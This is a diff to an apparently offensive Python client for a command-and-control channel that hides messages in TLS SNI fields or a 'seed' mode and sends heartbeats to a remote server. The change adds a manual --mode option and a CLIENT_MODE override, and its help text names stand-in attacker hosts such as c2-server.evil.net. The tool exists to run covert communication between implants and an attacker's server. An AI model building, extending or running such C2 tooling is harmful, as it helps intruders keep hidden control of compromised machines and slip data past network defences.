@@ -56,6 +56,7 @@ MAX_MSG_LEN = MAX_SNI_LEN - MAX_TLD_LEN - SNI_PADDING_LEN - 2  # == 245 bytes
 POLL_INTERVAL = 10  # seconds for how often we send a heartbeat to the server
 MAX_RETRIES = 5  # Max num of times we will retry sending a message before giving up
 VERBOSE = True
+CLIENT_MODE = "sni"
 
 
 class Session:
@@ -179,6 +180,9 @@ class Session:
             if use_sni:
                 self.mode = "sni"
             else:
+                self.mode = "seed"
+            # override mode if provided manually
+            if CLIENT_MODE != "sni":
                 self.mode = "seed"
             # Start up our Heatbeat in a seperate thread
             self.heartbeat_thread = threading.Thread(target=self._poll, daemon=True)
@@ -697,6 +701,13 @@ if __name__ == "__main__":
         help="Target C2 Server you want to connect to, Example: my-server.evil.net",
     )
     arg_parse.add_argument(
+        "-m",
+        "--mode",
+        metavar="mode",
+        required=False,
+        help="Manually set the smuggling mode [ 'sni' || 'seed' ]",
+    )
+    arg_parse.add_argument(
         "-v",
         "--verbose",
         action="store_true",
@@ -716,6 +727,9 @@ if __name__ == "__main__":
         arg_parse.error("Error: Either -d for direct connect or supply a valid --proxy argument")
     if not args.server:
         arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net:8443")
+    if args.mode:
+        if args.mode.lower() == "seed":
+            CLIENT_MODE = "seed"
     proxy = None
     proxy_hostname = proxy_scheme = ""
     proxy_port = 0
